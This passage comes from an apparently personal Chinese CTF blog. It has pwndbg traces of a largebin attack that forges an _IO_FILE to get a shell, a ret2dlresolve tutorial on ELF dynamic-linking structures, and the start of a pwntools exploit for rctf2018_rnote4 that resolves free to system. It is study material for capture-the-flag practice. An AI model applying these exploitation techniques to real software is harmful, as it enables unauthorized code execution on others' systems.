class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># delete(2)进入largebin中</span><br>Free chunk (largebins) | PREV_INUSE <span class="hljs-comment"># chunk2</span><br>Addr: <span class="hljs-number">0x55e7f0e171d0</span><br>Size: <span class="hljs-number">0x530</span> (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0x531</span>)<br>fd: <span class="hljs-number">0x7f3d1e11c030</span> <span class="hljs-string">&#x27;largebin&#x27;</span><br>bk: <span class="hljs-number">0x7f3d1e11c030</span> <span class="hljs-string">&#x27;largebin&#x27;</span><br>fd_nextsize: <span class="hljs-number">0x55e7f0e171d0</span><br>bk_nextsize: <span class="hljs-number">0x55e7f0e171d0</span><br>-------------------------------------------------------<br><span class="hljs-comment"># delete(0)进入unsortedbin 修改chunk2的结构</span><br>Free chunk (unsortedbin) | PREV_INUSE  <span class="hljs-comment"># chunk0</span><br>Addr: <span class="hljs-number">0x55884f4957a0</span><br>Size: <span class="hljs-number">0x520</span> (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0x521</span>)<br>fd: <span class="hljs-number">0x7f14523f2c00</span><br>bk: <span class="hljs-number">0x7f14523f2c00</span><br><br>Allocated chunk<br>Addr: <span class="hljs-number">0x55884f495cc0</span><br>Size: <span class="hljs-number">0x510</span> (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0x510</span>)<br><br>Free chunk (largebins) | PREV_INUSE <span class="hljs-comment"># chunk2</span><br>Addr: <span class="hljs-number">0x55884f4961d0</span><br>Size: <span class="hljs-number">0x530</span> (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0x531</span>)<br>fd: <span class="hljs-number">0x7f14523f3030</span><br>bk: <span class="hljs-number">0x7f14523f3030</span><br>fd_nextsize: <span class="hljs-number">0x55884f4961d0</span><br>bk_nextsize: <span class="hljs-number">0x7f14523f35a0</span> <span class="hljs-comment"># 指向_IO_all_list-0x20</span><br>-------------------------------------------------------<br><span class="hljs-comment"># chunk0进入largebin</span><br>Free chunk (largebins) | PREV_INUSE <span class="hljs-comment"># chunk0</span><br>Addr: <span class="hljs-number">0x562b142f37a0</span><br>Size: <span class="hljs-number">0x520</span> (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0x521</span>)<br>fd: <span class="hljs-number">0x7f6f7bb72030</span><br>bk: <span class="hljs-number">0x562b142f41d0</span><br>fd_nextsize: <span class="hljs-number">0x562b142f41d0</span><br>bk_nextsize: <span class="hljs-number">0x7f6f7bb725a0</span><br><br>Allocated chunk<br>Addr: <span class="hljs-number">0x562b142f3cc0</span><br>Size: <span class="hljs-number">0x510</span> (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0x510</span>)<br><br>Free chunk (largebins) | PREV_INUSE <span class="hljs-comment"># chunk2</span><br>Addr: <span class="hljs-number">0x562b142f41d0</span><br>Size: <span class="hljs-number">0x530</span> (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0x531</span>)<br>fd: <span class="hljs-number">0x562b142f37a0</span><br>bk: <span class="hljs-number">0x7f6f7bb72030</span><br>fd_nextsize: <span class="hljs-number">0x562b142f41d0</span><br>bk_nextsize: <span class="hljs-number">0x562b142f37a0</span>  <br><br><span class="hljs-comment"># 此时_IO_list_all写上了chunk0的地址   </span><br>pwndbg&gt; tele <span class="hljs-number">0x7f90cf3655a0</span><br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│  <span class="hljs-number">0x7f90cf3655a0</span> (_nl_global_locale+<span class="hljs-number">224</span>) —▸ <span class="hljs-number">0x7f90cf330e18</span> (_nl_C_name) ◂— <span class="hljs-number">0x636d656d5f5f0043</span> /* <span class="hljs-string">&#x27;C&#x27;</span> */<br>01:0008│  <span class="hljs-number">0x7f90cf3655a8</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-meta">... </span>↓     <span class="hljs-number">2</span> skipped<br>04:0020│  <span class="hljs-number">0x7f90cf3655c0</span> (_IO_list_all) —▸ <span class="hljs-number">0x55d06cf147a0</span> ◂— <span class="hljs-number">0x0</span><br>05:0028│  <span class="hljs-number">0x7f90cf3655c8</span> ◂— <span class="hljs-number">0x0</span><br>---------------------------------------------<br><span class="hljs-comment"># 写fake_IO_file</span><br>pwndbg&gt; p *_IO_list_all<br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = -<span class="hljs-number">2059</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x521</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x521</span>&gt;,<br>    _IO_read_end = <span class="hljs-number">0x0</span>,<br>    _IO_read_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_base = <span class="hljs-number">0x1</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x1</span>&gt;,<br>    _IO_write_ptr = <span class="hljs-number">0x2</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x2</span>&gt;,<br>    _IO_write_end = <span class="hljs-number">0x0</span>,<br>    _IO_buf_base = <span class="hljs-number">0x0</span>,<br>    _IO_buf_end = <span class="hljs-number">0x0</span>,<br>    _IO_save_base = <span class="hljs-number">0x0</span>,<br>    _IO_backup_base = <span class="hljs-number">0x0</span>,<br>    _IO_save_end = <span class="hljs-number">0x0</span>,<br>    _markers = <span class="hljs-number">0x0</span>,<br>    _chain = <span class="hljs-number">0x0</span>,<br>    _fileno = <span class="hljs-number">0</span>,<br>    _flags2 = <span class="hljs-number">0</span>,<br>    _old_offset = <span class="hljs-number">0</span>,<br>    _cur_column = <span class="hljs-number">0</span>,<br>    _vtable_offset = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>    _shortbuf = <span class="hljs-string">&quot;&quot;</span>,<br>    _lock = <span class="hljs-number">0x0</span>,<br>    _offset = <span class="hljs-number">0</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x5640c53968a0</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0</span>,<br>    _mode = -<span class="hljs-number">1</span>,<br>    _unused2 = <span class="hljs-string">&quot;\377\377\377\377&quot;</span>, <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">15</span> times&gt;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x7f487ed49f80</span> &lt;_IO_wfile_jumps&gt;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li><p>但是问题是我看hollk师傅源码解读是只有后释放的chunk_size（即chunk0）大于先进largebin的才会有largebin attack呀 但这的chunk0_size&lt;chunk2_size，不懂为啥还能写：因为libc的版本不一样了 你看看how2heap就知道2.32的是需要malloc一个小的 具体的解释可能需要看看源码了  （by the way how2heap真的很有用</p></li><li><p>_mode的设置为-1的作用和flag那具体怎么写能getshell的：<br>glibc源码中IO_file结构体的位置在<a href="https://elixir.bootlin.com/glibc/glibc-2.32/source">&#x2F;</a><a href="https://elixir.bootlin.com/glibc/glibc-2.32/source/libio">libio</a>&#x2F;<a href="https://elixir.bootlin.com/glibc/glibc-2.32/source/libio/bits">bits</a>&#x2F;<a href="https://elixir.bootlin.com/glibc/glibc-2.32/source/libio/bits/types">types</a>&#x2F;<a href="https://elixir.bootlin.com/glibc/glibc-2.32/source/libio/bits/types/struct_FILE.h">struct_FILE.h</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) <span class="hljs-comment">// _mode write_ptr   write_base字段的设置</span><br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>   )<br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="hljs-comment">//here to call the function</span><br></code></pre></td></tr></table></figure><blockquote><p>if内即为拉起宏调用所需条件<br>注意如果欲控制rdi获得shell，_flag需要为<br>b’ sh;’ + p64((~(2 | 0x8 | 0x800))&amp;0xffffffffffffffff)</p><p>~(2 | 0x8 | 0x800)结果就是0xFFFFF7F5</p><p>原文链接：<a href="https://blog.csdn.net/qq_62172019/article/details/130757223">https://blog.csdn.net/qq_62172019/article/details/130757223</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[*] Switching to interactive mode<br>sh: 1: \xf5\xf7\xff\xff: not found<br><span class="hljs-meta prompt_">$ </span><span class="language-bash"> </span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>官方WP应该是没用house of  但有个_mp结构体</p></li></ul><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="pwn-3"><a href="#pwn-3" class="headerlink" title="pwn"></a>pwn</h3><h4 id="EldenRingFinal"><a href="#EldenRingFinal" class="headerlink" title="EldenRingFinal"></a>EldenRingFinal</h4><ul><li>鸽了</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>re2dlresolve</title>
    <link href="/2023/12/10/ret2dlresolve/"/>
    <url>/2023/12/10/ret2dlresolve/</url>
    
    <content type="html"><![CDATA[<h3 id="1原理"><a href="#1原理" class="headerlink" title="1原理"></a>1原理</h3><blockquote><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/</a> wiki</p><p><a href="https://blog.csdn.net/qq_51868336/article/details/114644569">https://blog.csdn.net/qq_51868336/article/details/114644569</a> 这个放了源码 还有x64PartialRELRO的</p><p><a href="https://zhuanlan.zhihu.com/p/37572651">https://zhuanlan.zhihu.com/p/37572651</a> 这个更好理解一些 </p><p><a href="https://blog.csdn.net/Morphy_Amo/article/details/124121269">https://blog.csdn.net/Morphy_Amo/article/details/124121269</a></p></blockquote><p>Partial RELRO的需要伪造 reloc_arg ，r_info , st_name , str<br>NO RELRO的利用</p><ul><li><p>算了 还是自己记录下吧 虽然佬们讲得都很好 但是还是梳理一下更清楚</p></li><li><p>最基本的需要知道延迟绑定技术<br>然后ret2dlresolve主要关注的就是第一次调用时的解析真实地址的过程<br><img src="C:\Users\张梓烨\AppData\Roaming\Typora\typora-user-images\image-20231207203330003.png" alt="image-20231207203330003"></p><p>大概是这样一个过程</p><ul><li>step3那 push 0是该函数在rel.plt上的偏移,reloc_arg；然后jmp到plt[0]的位置</li><li>step3 step4相当于执行了<code>_dl_runtime_resolve(link_map,reloc_arg)</code></li></ul></li><li><p>elf中的.dynamic节：包含一些关于动态链接的关键信息，这里需要用到的就三个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs asm">LOAD:08049F0C                               ; ELF Dynamic Information<br>LOAD:08049F0C                               ; ===========================================================================<br>LOAD:08049F0C<br>LOAD:08049F0C                               ; Segment type: Pure data<br>LOAD:08049F0C                               ; Segment permissions: Read/Write<br>LOAD:08049F0C                               LOAD segment mempage public &#x27;DATA&#x27; use32<br>LOAD:08049F0C                               assume cs:LOAD<br>LOAD:08049F0C                               ;org 8049F0Ch<br>LOAD:08049F0C 01 00 00 00 01 00 00 00       _DYNAMIC Elf32_Dyn &lt;1, &lt;1&gt;&gt;             ; DATA XREF: LOAD:080480BC↑o<br>LOAD:08049F0C                                                                       ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o<br>LOAD:08049F0C                                                                       ; DT_NEEDED libc.so.6<br>LOAD:08049F14 0C 00 00 00 4C 83 04 08       Elf32_Dyn &lt;0Ch, &lt;804834Ch&gt;&gt;             ; DT_INIT<br>LOAD:08049F1C 0D 00 00 00 34 86 04 08       Elf32_Dyn &lt;0Dh, &lt;8048634h&gt;&gt;             ; DT_FINI<br>LOAD:08049F24 19 00 00 00 04 9F 04 08       Elf32_Dyn &lt;19h, &lt;8049F04h&gt;&gt;             ; DT_INIT_ARRAY<br>LOAD:08049F2C 1B 00 00 00 04 00 00 00       Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;                    ; DT_INIT_ARRAYSZ<br>LOAD:08049F34 1A 00 00 00 08 9F 04 08       Elf32_Dyn &lt;1Ah, &lt;8049F08h&gt;&gt;             ; DT_FINI_ARRAY<br>LOAD:08049F3C 1C 00 00 00 04 00 00 00       Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;                    ; DT_FINI_ARRAYSZ<br>LOAD:08049F44 F5 FE FF 6F AC 81 04 08       Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt;       ; DT_GNU_HASH<br># 指向.dynstr节的指针<br>LOAD:08049F4C 05 00 00 00 6C 82 04 08       Elf32_Dyn &lt;5, &lt;804826Ch&gt;&gt;               ; DT_STRTAB <br># 指向.dynsym节的指针<br>LOAD:08049F54 06 00 00 00 CC 81 04 08       Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt;               ; DT_SYMTAB<br>LOAD:08049F5C 0A 00 00 00 6B 00 00 00       Elf32_Dyn &lt;0Ah, &lt;6Bh&gt;&gt;                  ; DT_STRSZ<br>LOAD:08049F64 0B 00 00 00 10 00 00 00       Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;                  ; DT_SYMENT<br>LOAD:08049F6C 15 00 00 00 00 00 00 00       Elf32_Dyn &lt;15h, &lt;0&gt;&gt;                    ; DT_DEBUG<br>LOAD:08049F74 03 00 00 00 00 A0 04 08       Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt;               ; DT_PLTGOT<br>LOAD:08049F7C 02 00 00 00 28 00 00 00       Elf32_Dyn &lt;2, &lt;28h&gt;&gt;                    ; DT_PLTRELSZ<br>LOAD:08049F84 14 00 00 00 11 00 00 00       Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;                  ; DT_PLTREL<br># 指向.rel.plt的指针<br>LOAD:08049F8C 17 00 00 00 24 83 04 08       Elf32_Dyn &lt;17h, &lt;8048324h&gt;&gt;             ; DT_JMPREL<br>LOAD:08049F94 11 00 00 00 0C 83 04 08       Elf32_Dyn &lt;11h, &lt;804830Ch&gt;&gt;             ; DT_REL<br>LOAD:08049F9C 12 00 00 00 18 00 00 00       Elf32_Dyn &lt;12h, &lt;18h&gt;&gt;                  ; DT_RELSZ<br>LOAD:08049FA4 13 00 00 00 08 00 00 00       Elf32_Dyn &lt;13h, &lt;8&gt;&gt;                    ; DT_RELENT<br>LOAD:08049FAC FE FF FF 6F EC 82 04 08       Elf32_Dyn &lt;6FFFFFFEh, &lt;80482ECh&gt;&gt;       ; DT_VERNEED<br>LOAD:08049FB4 FF FF FF 6F 01 00 00 00       Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt;              ; DT_VERNEEDNUM<br>LOAD:08049FBC F0 FF FF 6F D8 82 04 08       Elf32_Dyn &lt;6FFFFFF0h, &lt;80482D8h&gt;&gt;       ; DT_VERSYM<br>LOAD:08049FC4 00 00 00 00 00 00 00 00       Elf32_Dyn &lt;0&gt;                           ; DT_NULL<br></code></pre></td></tr></table></figure><ul><li><p>.dynstr节：字符串表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asm">LOAD:0804826C                               ; ELF String Table<br>LOAD:0804826C 00                            byte_804826C db 0                       ; DATA XREF: LOAD:080481DC↑o<br>LOAD:0804826C                                                                       ; LOAD:0804825C↑o<br>LOAD:0804826C                                                                       ; LOAD:080482FC↓o<br>LOAD:0804826D 6C 69 62 63 2E 73 6F 2E 36 00 aLibcSo6 db &#x27;libc.so.6&#x27;,0  &lt;--以0结尾    ; DATA XREF: LOAD:080482EC↓o<br>LOAD:08048277 5F 49 4F 5F 73 74 64 69 6E 5F+aIoStdinUsed db &#x27;_IO_stdin_used&#x27;,0      ; DATA XREF: LOAD:0804825C↑o<br>LOAD:08048286 73 74 64 69 6E 00             aStdin db &#x27;stdin&#x27;,0                     ; DATA XREF: LOAD:0804823C↑o<br>LOAD:0804828C 73 74 72 6C 65 6E 00          aStrlen db &#x27;strlen&#x27;,0                   ; DATA XREF: LOAD:0804820C↑o<br>LOAD:08048293 72 65 61 64 00                aRead db &#x27;read&#x27;,0                       ; DATA XREF: LOAD:080481EC↑o<br>LOAD:08048298 73 74 64 6F 75 74 00          aStdout db &#x27;stdout&#x27;,0                   ; DATA XREF: LOAD:0804824C↑o<br>LOAD:0804829F 73 65 74 62 75 66 00          aSetbuf db &#x27;setbuf&#x27;,0                   ; DATA XREF: LOAD:080481DC↑o<br>LOAD:080482A6 5F 5F 6C 69 62 63 5F 73 74 61+aLibcStartMain db &#x27;__libc_start_main&#x27;,0 ; DATA XREF: LOAD:0804821C↑o<br>LOAD:080482B8 77 72 69 74 65 00             aWrite db &#x27;write&#x27;,0                     ; DATA XREF: LOAD:0804822C↑o<br>LOAD:080482BE 47 4C 49 42 43 5F 32 2E 30 00 aGlibc20 db &#x27;GLIBC_2.0&#x27;,0               ; DATA XREF: LOAD:080482FC↓o<br>LOAD:080482C8 5F 5F 67 6D 6F 6E 5F 73 74 61+aGmonStart db &#x27;__gmon_start__&#x27;,0        ; DATA XREF: LOAD:080481FC↑o<br></code></pre></td></tr></table></figure></li><li><p>.dynsym节：符号表（结构体数组），里面记录了各种符号的信息 这里我把setbuf符号展开了 具体结构看下面的结构体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs asm">LOAD:080481CC                               ; ELF Symbol Table<br>LOAD:080481CC 00 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;0&gt;<br>LOAD:080481DC 33 00 00 00 00 00 00 00 00 00+dd offset aSetbuf - offset byte_804826C ; st_name ; &quot;setbuf&quot;<br>LOAD:080481DC 00 00 12 00 00 00             dd 0                                    ; st_value<br>LOAD:080481DC                               dd 0                                    ; st_size<br>LOAD:080481DC                               db 12h                                  ; st_info<br>LOAD:080481DC                               db 0                                    ; st_other<br>LOAD:080481DC                               dw 0                                    ; st_shndx<br>LOAD:080481EC 27 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;offset aRead - offset byte_804826C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;<br>LOAD:080481FC 5C 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;offset aGmonStart - offset byte_804826C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;<br>LOAD:0804820C 20 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;offset aStrlen - offset byte_804826C, 0, 0, 12h, 0, 0&gt; ; &quot;strlen&quot;<br>LOAD:0804821C 3A 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;offset aLibcStartMain - offset byte_804826C, 0, 0, 12h, 0, 0&gt; ; &quot;__libc_start_main&quot;<br>LOAD:0804822C 4C 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;offset aWrite - offset byte_804826C, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;<br>LOAD:0804823C 1A 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;offset aStdin - offset byte_804826C, 0, 0, 11h, 0, 0&gt; ; &quot;stdin&quot;<br>LOAD:0804824C 2C 00 00 00 00 00 00 00 00 00+Elf32_Sym &lt;offset aStdout - offset byte_804826C, 0, 0, 11h, 0, 0&gt; ; &quot;stdout&quot;<br>LOAD:0804825C 0B 00 00 00 4C 86 04 08 04 00+Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804826C, offset _IO_stdin_used, 4, 11h, 0, 10h&gt; ; &quot;_IO_stdin_used&quot;<br>LOAD:0804826C                               ; ELF String Table<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Word    st_name; <span class="hljs-comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span><br>  Elf32_Addr    st_value;<br>  Elf32_Word    st_size;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_info; <span class="hljs-comment">//对于导入函数符号而言，它是0x12</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other;<br>  Elf32_Section st_shndx;<br>&#125;Elf32_Sym; <span class="hljs-comment">//对于导入函数符号而言，其他字段都是0</span><br></code></pre></td></tr></table></figure></li><li><p>.rel.plt节：重定位表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">LOAD:08048324 0C A0 04 08 07 01 00 00       dd 804A00Ch                             ; r_offset ; R_386_JMP_SLOT setbuf<br>LOAD:08048324                               dd 107h                                 ; r_info<br>LOAD:0804832C 10 A0 04 08 07 02 00 00       Elf32_Rel &lt;804A010h, 207h&gt;              ; R_386_JMP_SLOT read<br>LOAD:08048334 14 A0 04 08 07 04 00 00       Elf32_Rel &lt;804A014h, 407h&gt;              ; R_386_JMP_SLOT strlen<br>LOAD:0804833C 18 A0 04 08 07 05 00 00       Elf32_Rel &lt;804A018h, 507h&gt;              ; R_386_JMP_SLOT __libc_start_main<br>LOAD:08048344 1C A0 04 08 07 06 00 00       Elf32_Rel &lt;804A01Ch, 607h&gt;              ; R_386_JMP_SLOT write<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Addr    r_offset; <span class="hljs-comment">//指向GOT表的指针</span><br>  Elf32_Word    r_info;<br>  <span class="hljs-comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span><br>  <span class="hljs-comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span><br>  <span class="hljs-comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span><br>&#125; Elf32_Rel;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>上面说到<code>_dl_runtime_resolve(link_map,reloc_arg)</code>的link_map包含了.dynamic的指针，通过link_map可以访问到.dynamic节；reloc_arg是当前要调用的导入函数在<code>.rel.plt</code>中的偏移（不过64位的话就直接是index下标）</p></li><li><blockquote><p><strong>dl_runtime_resolve会</strong></p><ol><li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li><li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li><li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li><li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li><li>调用这个函数</li></ol></blockquote></li></ul><h3 id="2-利用原因"><a href="#2-利用原因" class="headerlink" title="2 利用原因"></a>2 利用原因</h3><ul><li>没有输出函数的时候就没法泄露地址 这个时候就可用dl_resolve</li></ul><h3 id="3-利用方法"><a href="#3-利用方法" class="headerlink" title="3 利用方法"></a>3 利用方法</h3><h4 id="3-1NORELRO：dynaic节可修改"><a href="#3-1NORELRO：dynaic节可修改" class="headerlink" title="3.1NORELRO：dynaic节可修改"></a>3.1NORELRO：dynaic节可修改</h4><blockquote><p>因为<code>ret2dl-resolve</code>会从<code>.dynamic</code>里面拿<code>.dynstr</code>字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够篡改这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。</p></blockquote><p>也就是伪造Elf32_Rel和Elf32_Sym就可</p><h5 id="64位NORELRO-堆-–rctf2018-rnote4"><a href="#64位NORELRO-堆-–rctf2018-rnote4" class="headerlink" title="64位NORELRO 堆 –rctf2018_rnote4"></a>64位NORELRO 堆 –rctf2018_rnote4</h5><ul><li><p>没有任何输出函数 运行有点难受的 正因为没有输出 用dl_resolve将free改成system</p></li><li><pre><code class="python">#coding:utf8from pwn import * # sh = process(&#39;./RNote4&#39;)sh = remote(&quot;node4.buuoj.cn&quot;, 29228)elf = ELF(&#39;./RNote4&#39;)free_got = elf.got[&#39;free&#39;]free_plt = 0x0000000000400626#在NO relro的情况下伪造dynstr即可解析任意函数fake_dynstr_addr = 0x00000000006020D0 + 0x100fake_dynstr = &#39;\x00&#39;*0x5F + &#39;system\x00&#39;# 0x5F=0x457-0x3f8 free改为systemfake_dynstr = fake_dynstr.ljust(0x73,&#39;\x00&#39;)# 0x73=0x46b-0x3f8fake_dynstr += &#39;GLIBC_2.4\x00GLIBC_2.2.5\x00&#39;# 也可以不写 反正一样dt_strtab = 0x0000000000601EB0 def add(size,content):   sh.send(p8(1))   sh.send(p8(size))   sh.send(content) def edit(index,size,content):   sh.send(p8(2))   sh.send(p8(index))   sh.send(p8(size))   sh.send(content) def delete(index):   sh.send(p8(3))   sh.send(p8(index)) add(0x20,&#39;a&#39;*0x20) #0add(0x80,&#39;b&#39;*0x80) 